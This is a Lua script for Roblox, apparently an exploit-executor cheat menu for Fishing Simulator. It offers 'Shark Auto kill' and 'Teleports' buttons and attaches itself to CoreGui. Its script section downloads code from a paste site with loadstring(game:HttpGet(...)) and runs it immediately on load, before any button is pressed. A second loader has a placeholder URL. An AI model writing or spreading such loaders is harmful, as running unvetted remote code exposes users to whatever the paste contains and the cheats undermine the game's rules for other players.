-- Gui to Lua
-- Version: 3.2
-- Instances:
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local Autokillsharks = Instance.new("TextButton")
local Teleportsandmore = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
--Properties:
ScreenGui.Parent = game.CoreGui
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(170, 0, 127)
Frame.BorderColor3 = Color3.fromRGB(25, 23, 22)
Frame.Position = UDim2.new(0.00623054802, 0, 0.588628829, 0)
Frame.Size = UDim2.new(0, 242, 0, 138)
Frame.Visible = false
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(104, 7, 80)
TextLabel.Size = UDim2.new(0, 198, 0, 29)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "GUI by RealVzlomy"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(104, 7, 80)
TextButton.Position = UDim2.new(0.818181813, 0, 0, 0)
TextButton.Size = UDim2.new(0, 44, 0, 29)
TextButton.Font = Enum.Font.GothamBlack
TextButton.Text = "X"
TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
Autokillsharks.Name = "Auto kill sharks"
Autokillsharks.Parent = Frame
Autokillsharks.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Autokillsharks.Position = UDim2.new(0.0392444693, 0, 0.451774865, 0)
Autokillsharks.Size = UDim2.new(0, 104, 0, 40)
Autokillsharks.Font = Enum.Font.SourceSans
Autokillsharks.Text = "Shark Auto kill GUI"
Autokillsharks.TextColor3 = Color3.fromRGB(0, 0, 0)
Autokillsharks.TextSize = 14.000
Teleportsandmore.Name = "Teleports and more"
Teleportsandmore.Parent = Frame
Teleportsandmore.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Teleportsandmore.Position = UDim2.new(0.519498229, 0, 0.457636625, 0)
Teleportsandmore.Size = UDim2.new(0, 104, 0, 40)
Teleportsandmore.Font = Enum.Font.SourceSans
Teleportsandmore.Text = "Teleports & more"
Teleportsandmore.TextColor3 = Color3.fromRGB(0, 0, 0)
Teleportsandmore.TextSize = 14.000
TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.Position = UDim2.new(0.0426310748, 0, 0.802118182, 0)
TextLabel_2.Size = UDim2.new(0, 220, 0, 19)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "I don't take any credit for these scripts!"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 14.000
TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.Position = UDim2.new(0.0426310748, 0, 0.256410241, 0)
TextLabel_3.Size = UDim2.new(0, 220, 0, 19)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Best Fishing Simulator scrips!"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000
-- Scripts:
local function WOYDCR_fake_script() -- Autokillsharks.Script
	local script = Instance.new('Script', Autokillsharks)
	loadstring(game:HttpGet(("https://pastes.io/raw/s9ubi7fdpn")))()
end
coroutine.wrap(WOYDCR_fake_script)()
local function DHJIPVD_fake_script() -- Teleportsandmore.Script
	local script = Instance.new('Script', Teleportsandmore)
	loadstring(game:HttpGet(('#'),true))()
end
coroutine.wrap(DHJIPVD_fake_script)()
